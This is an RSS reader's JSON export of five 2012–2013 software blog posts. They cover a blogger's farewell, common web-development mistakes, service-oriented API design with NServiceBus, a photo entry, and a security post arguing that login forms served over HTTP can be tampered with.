{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/BbaDji_ccF0/","title":"And… That’s All Folks","published":{"$wrap":"$date","v":1337029716000,"h":"2012-05-14T21:08:36.000Z"},"starred":false,"read":false,"content":"<p>I started blogging about 5 years ago, and over the years I've published 653 posts. This will be the last one. I had some specific personal goals in mind when I started blogging, and I've gotten everything I've wanted out of it, and more. I learned a lot, and I'm happy with a lot of the feedback I've gotten over the years. But the time has come to move on. I want to get back to writing more code instead of writing about writing code. I've mostly enjoyed writing blog posts, but in the past year it has felt more like a chore than a hobby, so it's probably a good idea to just call it quits.</p><p>I'm not entirely sure yet what I'm going to do with the content on this blog. There's quite a few posts I surely want to keep around, but certainly not all of them. For now, I'm going to keep the blog up so everything stays available but after a while, I'm gonna shut it down. I might keep up some kind of static archive of my favorite posts, or I might just put them on GitHub in MarkDown format. If you have any suggestions on what I should do with it, I'd be happy to hear them.</p><p>I will remain active on <ahref=\"http://twitter.com/davybrion\">Twitter</a> and I plan to be more active on <ahref=\"http://github.com/davybrion\">GitHub</a> from now on. But the blogging thing ends here and now. I'd like to thank everyone for reading, especially the ones who've been around since the beginning. It's been an interesting ride for me, but it's time for something else <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/BbaDji_ccF0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1165}}
{"k":"0000000084","o":"0000013292","v":"001"}
{"_id":1166,"_uid":1166,"_dt":1373742620949,"_s":"b0ed99f876ea0ee29a7b558a5afdddef"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42301519/0/scotthanselman~Stop-Doing-Internet-Wrong.aspx","title":"Stop Doing Internet Wrong.","published":{"$wrap":"$date","v":1371168859000,"h":"2013-06-14T00:14:19.000Z"},"starred":false,"read":false,"content":"<div><p>Some days...some days it's frustrating to be on the web. We're<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/JavaScriptIsWebAssemblyLanguageAndThatsOK.aspx\">compiling C++ into JavaScript and running Unreal in the browser</a>but at the same time, here in 2013, we're still making the same mistakes. And by we, I mean, the set of web developers who aren't<strong>us</strong>, right Dear Reader? Because surely you're not doing any of these things. ;)</p><p>All of these are solvable problems. They aren't technically hard, or even technically interesting. I consider these\"will-required\"problems. You need the knowledge that it's wrong and the will to fix it. As users - and web developers - we need to complain to the right people and help fix it.</p><h3>Redirecting a deep desktop link to a mobile home page</h3><p>Google has decided that the practice of taking perfectly good deep links like foo.com/something/deep, detecting a mobile device, then redirecting to m.foo.com is user-hostile. In fact, the GoogleBot is going to declare these\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~googlewebmastercentral.blogspot.com/2013/06/changes-in-rankings-of-smartphone_11.html\">faulty redirects</a>\"and ding sites in the search result ranking.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~googlewebmastercentral.blogspot.com/2013/06/changes-in-rankings-of-smartphone_11.html\">Stated simply</a>:</p><blockquote><p>Avoiding irrelevant redirects is very easy: Simply redirect smartphone users from a desktop page to its equivalent smartphone-optimized page. If the content doesn't exist in a smartphone-friendly format, showing the desktop content is better than redirecting to an irrelevant page.</p></blockquote><p>For example, if I want to go to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.mcmenamins.com/Pubs\">http://www.mcmenamins.com/Pubs</a>page, but I do it on mobile, they ALWAYS redirect me to /mobile. Always. Even though I have a quad-processor pocket supercomputer with gigs of space I've still surfing a second-class internet.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.mcmenamins.com/Pubs\"><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/image_5.png\"width=\"505\"height=\"350\"></a> <a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.mcmenamins.com/mobile\"><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/image_9.png\"width=\"178\"height=\"350\"></a></p><h3>I don't want your crappy app</h3><p>That means you Quora. I am in my browser, unless I'm going to the App Store, let's assume if I'm in the browser, I want to be on the web.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/IdLikeToUseTheWebMyWayThankYouVeryMuchQuora.aspx\"><img title=\"You suck Quora\"alt=\"You suck Quora\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/76ed84d64329_EFFF/image_3.png\"></a></p><h3>Giant Interstitial Ads</h3><p>I'm looking at you, Forbes.com. I GET IT. YOU HAVE ADS.</p><p><img title=\"Interstitial Ads are Evil\"style=\"display: inline\"alt=\"Interstitial Ads are Evil\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/image_18.png\"width=\"502\"height=\"405\"></p><p>Stay classy.</p><h3>Labels for Input Forms</h3><p>I hate seeing a checkbox and only being able to click on that exact checkbox.</p><pre class=\"brush: xml; toolbar: false; auto-links: false;\">&lt;p&gt;Which fruit would you like for lunch?&lt;/p&gt;<br>&lt;form&gt;<br>&lt;input type=\"radio\"name=\"fruit\"id=\"banana\"/&gt;<br>&lt;label for=\"banana\"&gt;Banana&lt;/label&gt;<br>&lt;input type=\"radio\"name=\"fruit\"id=\"None\"/&gt;<br>&lt;label for=\"none\"&gt;None&lt;/label&gt;<br>&lt;/form&gt;</pre><p>It's so easy to just associate a label with an input. Please do  it, then we can all have something larger to click on.</p><h3>Breaking Hyperlinks</h3><p>We're still doing this. Haven't we learned that<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.w3.org/Provider/Style/URI.html\">Cool URIs Don't Change</a>? It was true in 1998 when that was written and it's true now. The web as we know it was created in 1990 and made truly open in 1993 and the link to the First Web Page (yes, Capital Letters) is still<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~info.cern.ch/hypertext/WWW/TheProject.html\">http://info.cern.ch/hypertext/WWW/TheProject.html</a>. I love that they've done the work to keep that link alive.</p><p>There's just no excuse for this. With .htaccess files and web.config files, maintain a list of redirects and do your best to test them. Maintaining deep and complex links can be complex, but if you're companyname.com/about link dies because you switch from PHP to Rails, there's just no excuse for that. I'm your User and I have always typed /about. Don't'give me a To Do like\"Update your bookmarks!\"I didn't come here for a To-Do, I came her for your damn about page.<strong>YOU figure it out.</strong></p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/okfinethisisnotagoodexamplebutitcouldhavebeenabadpage\"><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/image_15.png\"width=\"720\"height=\"255\"></a></p><h3>Click the Flag that represents your Language</h3><p>I've often been asked to\"select my language\"from a list of country flags, and ended up clicking on the Union Jack to represent\"English.\"I'm sure the actual English don't appreciate an American declaring they speak English. ;)</p><p><img title=\"Nothing says pick a language like all the United Nations Flags\"style=\"display: inline\"alt=\"Nothing says pick a language like all the United Nations Flags\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/flag-translate_2.png\"width=\"298\"height=\"294\"></p><p>but I know I'm not the only one who realizes that a Flag is a lousy representation of a language, especially since your browser<strong>is announcing what languages you speak with every web request</strong>.</p><pre>Accept:text/html<br>Accept-Encoding:gzip,deflate,sdch<br>Accept-Language:en-US,en;q=0.8</pre><p>There can be a whole list of languages in the Accept-Language header,<strong>in the order the user prefers them! </strong>Use that data, it's there for you to use.</p><h3>You know my Zip Code, why am I entering my State?</h3><p>For folks living in the states, we're always asked to enter our postal code (ZIP code)<strong>and</strong>our city and state, even<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~stackoverflow.com/questions/492951/how-can-i-get-state-and-city-information-from-a-us-zip-code-through-an-online-we\">though there are dozens of great APIs and Databases that can give you that information</a>.</p><p><img title=\"Don't make me enter my state\"style=\"display: inline\"alt=\"Don't make me enter my state\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/crappyaddress_3.png\"width=\"407\"height=\"256\"></p><p>The meta-point is this: If you can reliably determine something from the user (language, location, country, preference) without invading their privacy, do it! Save them a little time!</p><h3>Resizing Giant Images with width and height attributes</h3><p>Perhaps take a moment and remind your boss that the 6 megapixel photo that he or she took with their new Canon EOS is<strong>not</strong>a good background image for your corporate site...especially if it's a 4 megabyte JPGs.</p><p>Oh, that's OK, we can just&lt;img src=\"bigassfile.jpg\"width=\"100\"height=\"100\"&gt; and that will make it smaller. No, that just downloads the giant file and then makes your browser do the work to resize it on the client.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/bigasswallpaper_2.jpg\"><img title=\"Big ass picture\"style=\"display: inline\"alt=\"Big ass picture\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/bigasswallpaper_thumb.jpg\"width=\"100\"height=\"62\"></a></p><p>Resize first, and squish often. Also run all your PNGs through<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pnggauntlet.com/\">PNGGauntlet</a>or<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~advsys.net/ken/utils.htm\">PNGOut</a>.</p><h3>Serving pages from both www. and naked domains</h3><p align=\"left\">If you've got example.com/something AND www.example.com/something both serving up the same content, consider\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/UsingISAPIRewriteToCanonicalizeASPNETURLsAndRemoveDefaultaspx.aspx\">canonicalizing</a>\"your URLs. You can do this with rel=\"canonical\"in your META tags, but that only hides the problems and makes the Googlebot happy. Instead, why not PICK ONE and serve a 301 redirect to the other? Did you know that there are rules built into IIS7 that will set this up for you? You can even<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/RedirectingASPNETLegacyURLsToExtensionlessWithTheIISRewriteModule.aspx\">remove your .aspx extension if that makes you happy</a>. You can do it!</p><p align=\"left\"><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Youre-Doing-Internet-Wrong_C04B/image_12.png\"width=\"690\"height=\"460\"></p><p align=\"left\">The same is true if you do the same thing for / and /default.html. Pick one if you can, and redirect the other.</p><pre class=\"brush: xml; toolbar: false; auto-links: false;\">&lt;system.webServer&gt;<br>&lt;rewrite&gt;<br>&lt;rules&gt;<br>&lt;rule name=\"CanonicalHostNameRule1\"stopProcessing=\"true\"&gt;<br>&lt;match url=\"(.*)\"/&gt;<br>&lt;conditions&gt;<br>&lt;add input=\"{HTTP_HOST}\"matchType=\"Pattern\"pattern=\"^hanselman\\.com$\"ignoreCase=\"true\"negate=\"false\"/&gt;<br>&lt;/conditions&gt;<br>&lt;action type=\"Redirect\"url=\"http://www.hanselman.com/{R:1}\"redirectType=\"Found\"/&gt;<br>&lt;/rule&gt;<br>&lt;match url=\"blog/default.aspx\"/&gt;<br>&lt;action type=\"Redirect\"url=\"blog/\"redirectType=\"Found\"/&gt;<br>&lt;/rule&gt;<br>&lt;rules&gt;<br>&lt;rewrite&gt;<br>&lt;system.webServer&gt;</pre><h3 align=\"left\">Others?</h3><p align=\"left\">What are some great examples that you think Break The Internet...but that are easily fixed if we have the will?</p><hr><p><strong>Sponsor:</strong>Big thanks to RedGate for sponsoring the feed this week! Check out<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11pRJTa\"><strong>Deployment Manager</strong></a><strong></strong>–app deployment without the stress.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11pRJTa\">Deploy .NET code& SQL Server databases in one simple process</a>from a web-based UI. Works with local, remote and cloud servers.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11pRJTa\">Try it<strong>free</strong></a>.<br/><hr/>©2013 Scott Hanselman. All rights reserved.<br/></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42301519/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42301519/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42301519/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42301519/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42301519/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42301519/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1166}}
{"k":"0000000084","o":"0000009349","v":"001"}
{"_id":1167,"_uid":1167,"_dt":1373742620950,"_s":"6bac02909c441226b11fceae21d508c1"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/k4km4rSjZH4/","title":"Service-Oriented API implementations","published":{"$wrap":"$date","v":1355153367000,"h":"2012-12-10T15:29:27.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/gears.jpg\" alt=\"gears\" title=\"gears\" width=\"250\" height=\"167\" style=\"float:right; margin-left:10px; margin-bottom:10px;\"/>It’s quite common for our systems to need to expose an API for external parties to call that isn’t exactly aligned with our service boundaries – at least, when you follow the “vertical services” model rather than the “layered services” approach. I’ve blogged many times about the problems with layering, so I won’t go into that now beyond to say that you really, REALLY, should avoid it.</p><h3>A short intro to SOA, done right</h3><p>In the “vertical services” approach I espouse, you often see components from multiple services deployed to any given endpoint. While these services usually don’t need to communicate with each other at all, occasionally you’ll see them leaving “breadcrumbs” behind for each other – things like UserId or OrderId in the session. What’s especially important is that these IDs are accessible even before the entity is finalized – this enables each service to collect its own data without needing any other service to know about that data.</p><p>In an ecommerce environment, we would see one service owning money, another the product catalog (excluding prices, those would be owned by the previous service), another service owning the customers’ payment info (credit cards, etc), and yet another owning shipping addresses – all of these separate from the one that owns the shopping cart. Let’s call these Finance, Catalog, Payment, Shipping, and finally Shopping – just so that we have something to reference later.</p><h3>The API</h3><p>While we can do all sorts of cool browser composition with the UI in our own system, enabling each service to collect and display its own information, if we want to expose an API for clients to call, we wouldn’t want to force those clients to have to make a separate call to each service in order to make a purchase. Instead, we’d want something that looks like:</p><p>MakePurchase(Guid orderId, Dictionary<Guid, int> cart, CreditCardInfo cc, Address shippingAddress)</p><p>In case you were wondering, the service which owns the definition of this API is different from all of the above services – it is a service that is primarily technical in nature and is responsible for things like integration and data transformations. I call this service IT/Ops.</p><h3>Getting the data from the API to the services</h3><p>So, we don’t want any of our business-centric services to know about anybody else’s data structures, so that leaves it to IT/Ops to pass the data to them. The thing is that we still want to do that in the most loosely-coupled way possible – with messaging being a good candidate for that.</p><p>So, what we’ll do is have IT/Ops send a message containing the data to the other services, but with a slight twist.</p><p>Here’s what the code would look like with <a href=\"http://particular.net/nservicebus\">NServiceBus</a>:<br/><br/></p><pre class=\"csharpcode\">Bus.SendLocal(<span class=\"kwrd\">new</span> Order { Id = orderId, Cart = cart,CreditCard = cc, ShippingAddress = shippingAddress });</pre><p><br/><br />Why the SendLocal?</p><p>So that the components from the other services can all run together with IT/Ops in the same process giving a nice tight deployment model.</p><p>Before we get to the services, let me show you the Order class – specifically, the interfaces it implements:<br/><br/></p><pre class=\"csharpcode\"><span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> Order : ShoppingOrder, PaymentsOrder, ShippingOrder{<span class=\"kwrd\">public</span> Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> Dictionary&lt;Guid, <span class=\"kwrd\">int</span>&gt; Cart { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> CreditCardInfo CreditCard { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }<span class=\"kwrd\">public</span> Address ShippingAddress { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> ShoppingOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }Dictionary&lt;Guid, <span class=\"kwrd\">int</span>&gt; Cart { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> PaymentsOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }CreditCardInfo CreditCard { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}<span class=\"kwrd\">public</span> <span class=\"kwrd\">interface</span> ShippingOrder{Guid OrderId { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }Address ShippingAddress { <span class=\"kwrd\">get</span>; <span class=\"kwrd\">set</span>; }}</pre><p><br/><br/><br />Each of the above interfaces represents the data that each service cares about. Therefore, each service will provide an assembly that handles that message/data and persists it to its database, like this:<br/><br/></p><pre class=\"csharpcode\"><span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> ShoppingAPIHandler : IHandleMessages&lt;ShoppingOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(ShoppingOrder message){<span class=\"rem\">//persist to shopping service db</span>}}<span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> PaymentsAPIHandler : IHandleMessages&lt;PaymentsOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(PaymentsOrder message){<span class=\"rem\">//persist to payment service db</span>}}<span class=\"kwrd\">public</span> <span class=\"kwrd\">class</span> ShippingAPIHandler : IHandleMessages&lt;ShippingOrder&gt;{<span class=\"kwrd\">public</span> <span class=\"kwrd\">void</span> Handle(ShippingOrder message){<span class=\"rem\">//persist to shipping service db</span>}}</pre><p><br/><br/></p><p>Since the Order object being sent is a polymorphic match for all of these interfaces, NServiceBus knows to invoke all of these handlers. By the way, if you care about the order of invocation, then you can control that as well (but I won’t get into that here).</p><p>Also, since all of these handler assemblies are deployed to the same endpoint, and the Order object is sent just once, this means that all the handlers will be invoked in a single transaction on a single thread – either all of them succeeding, or all failing. Since they’re all connected on the same Order Id, referential integrity can be preserved as well.</p><h3>Wrapping up</h3><p>When you are building a system on SOA principles, you’ll often find that you need a service like IT/Ops to handle data transformation and other broker-centric tasks. While much of SOA is based on the Bus Architectural Style – meaning primarily publish/subscribe interaction between services – that doesn’t mean that your business-centric services cannot have their components deployed in the same process.</p><p>I’d go so far as to say that if you aren’t deploying components from multiple services in process with each other at least some of the time then it’s quite likely that your service boundaries are probably incorrect.</p><p>Anyway, I hope you found this post interesting. Shout out to Slawek who gave me the idea for this post.</p><p>By the way, if you’d like to learn more about these kinds of patterns, the next batch of courses is open for registration – but the early bird prices are almost over, so you’d better hurry. </p><p>Register for   <a href=\"http://www.eventbee.com/v/nservicebus/event?eid=918444435\">Denver CO, USA</a>,     <a href=\"http://www.professional-developer-training.net/items.aspx?catId=c45\">Bad Ems, Germany</a>,     <a href=\"http://www.eventbee.com/v/nservicebus/event?eid=948045332\">Perth, Australia</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=k4km4rSjZH4:9wdkyTVrbVs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=k4km4rSjZH4:9wdkyTVrbVs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=k4km4rSjZH4:9wdkyTVrbVs:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=k4km4rSjZH4:9wdkyTVrbVs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=k4km4rSjZH4:9wdkyTVrbVs:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/k4km4rSjZH4\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1167}}
{"k":"0000000084","o":"0000000426","v":"001"}
{"_id":1168,"_uid":1168,"_dt":1373742620950,"_s":"4eedc8afc05ccf47b92c1155dc9dfbfb"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/photos/47.html","title":"photostream 47","published":{"$wrap":"$date","v":1370356260000,"h":"2013-06-04T14:31:00.000Z"},"starred":false,"read":false,"content":"<p><a href = 'http://martinfowler.com/photos/47.html'><img src = 'http://martinfowler.com/photos/47.jpg'></img></a></p><p></p><p>Brooklyn, NY</p>","author":false,"_id":{"$wrap":"$oid","v":1168}}
{"k":"0000000084","o":"0000007040","v":"001"}
{"_id":1169,"_uid":1169,"_dt":1373742620950,"_s":"ca1eaf0ea97d514ca3b7595189a51874"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/2MOCxoW2JyE/your-login-form-posts-to-https-but-you.html","title":"Your login form posts to HTTPS, but you blew it when you loaded it over HTTP","published":{"$wrap":"$date","v":1369050360001,"h":"2013-05-20T11:46:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s an often held conversation between concerned website user and site owner:</p><p><strong>User:</strong>“Hey mate, your website isn’t using SSL when I enter my password, what gives?!”</p><p><strong>Owner:</strong>“Ah, but it<em>posts</em>to HTTPS so your password is secure! We take security seriously. Our measures are robust.” (and other random, unquantifiable claims)</p><p>Loading login forms over HTTP renders any downstream transport layer security almost entirely useless. Rather than just tell you what’s wrong with this, let me show precisely why this is with a site that implements this pattern:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/nm-85-bDP6c?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>How’s that for simple?! What people forget about SSL is that<a href=\"http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html\">it’s not about encryption</a>. Well that’s one feature of secure sockets, another really essential one is<em>integrity</em>insofar as it gives us confidence that the website content hasn’t been manipulated.<em>Anything you load over an HTTP connection can be easily changed by a man in the middle</em>which is why it’s absolutely essential to load those login forms over a secure connection. OWASP is very specific about this in<a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">part 9 of their Top 10 web application security risks</a>and summarise it well in the<a href=\"https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\">transport layer protection cheat sheet</a>:</p><blockquote><p>The initial login page, referred to as the \"login landing page\", must be served over TLS. Failure to utilize TLS for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location.</p></blockquote><p>It’s not just Woolworths doing this, in fact it’s extremely common and you’ll see it on<a href=\"http://www.godaddy.com/\">GoDaddy</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"GoDaddy login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-R3oO1habrgc/UZoNCGOyApI/AAAAAAAAFVk/f_oRmxXp2HE/image5.png?imgmax=800\" border=\"0\"></p><p>On<a href=\"http://www.pandora.com/\">Pandora</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Pandora login page loaded over HTTP\" src=\"http://lh6.ggpht.com/-j0-9eUp6Duo/UZoNC8NU1JI/AAAAAAAAFVs/htmQtMnpu04/image8.png?imgmax=800\" border=\"0\"></p><p>And even on the<a href=\"http://www.ft.com/\">Financial Times</a>:</p><p><img width=\"741\" height=\"413\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Financial Times login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-XB1UNVWqNSA/UZoNDirIWgI/AAAAAAAAFV0/xi0Lb_lkJSE/image61.png?imgmax=800\" border=\"0\"></p><p>I’m calling out these simply because they’re high-profile sites yet they all load the login forms over HTTP and post to HTTPS. Why aren’t they implementing SSL correctly? Most likely convenience; customers can login direct from the homepage and they can have it delivered over HTTP. Mind you Pandora links off to a login page so why they couldn’t just serve that securely to begin with is a bit of a mystery.</p><p>So how should it be done? Load the login form over HTTPS, either by linking to a dedicated login page or popping it up in a separate window (although there’s a UX argument against this). Even better, just load the whole site over HTTPS! Yes, there are some barriers to HTTPS across the board (managing certs in web farms, dependencies on assets from third parties, impact on CDNs, etc) but it sure solves the login form issue. Check out<a href=\"http://www.netflix.com\">Netflix’s approach</a>– straight into HTTPS, job done!</p><p>The other issue with the examples above is that potential manipulation of the content aside, missing HTTPS on the login form leads to exactly the discussion this post opened with – users not believing their credentials are protected. All the messaging we’ve been delivering to website users since the early days of the web about checking for the padlock in the browser address bar goes down the drain because it’s simply not there! There’s no assurance that their credentials will be protected and it’s a real shame to dilute such an important security message.</p><p>As for how the exploit in the video works, it’s just a simple<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>to inject the keylogger before the body tag closes off. The keylogger itself is<a href=\"https://code.google.com/p/javascript-keylogger/\">over on Google Code</a>, the only code I wrote to incorporate it was the script tags you saw at the end of the video and the “Hack Yourself” website which receives the logged keys. It really is that simple.</p><p>Whilst Fiddler is good for demonstration purposes, clearly an actual weaponised attack would work differently but the principle is the same: When unencrypted traffic passes through a node on the network – NIC, ethernet cable, router, proxy, ISP, etc. – it may be observed or manipulated by an attacker. This isn’t theoretical, there are many precedents such as<a href=\"http://www.thetechherald.com/articles/Tunisian-government-harvesting-usernames-and-passwords/12429/\">the Tunisian government harvesting Facebook credentials en mass</a>.</p><p>This is all a bit odd really, I mean these sites have gone to the effort of implementing<em>some</em>SSL but then blown it by loading those login forms over HTTP. As we saw with Woolworths, posting over a secure connection is completely useless if there’s no integrity in the login form itself, an attacker may already have the credentials by then if the connection is compromised which is the very risk they all implemented SSL to protect from in the first place!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/2MOCxoW2JyE\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1169}}
{"k":"0000000084","o":"0000002832","v":"001"}
{"_id":1170,"_uid":1170,"_dt":1373742620952,"_s":"dcbb50ce463deec82b6728e1875b914c"}
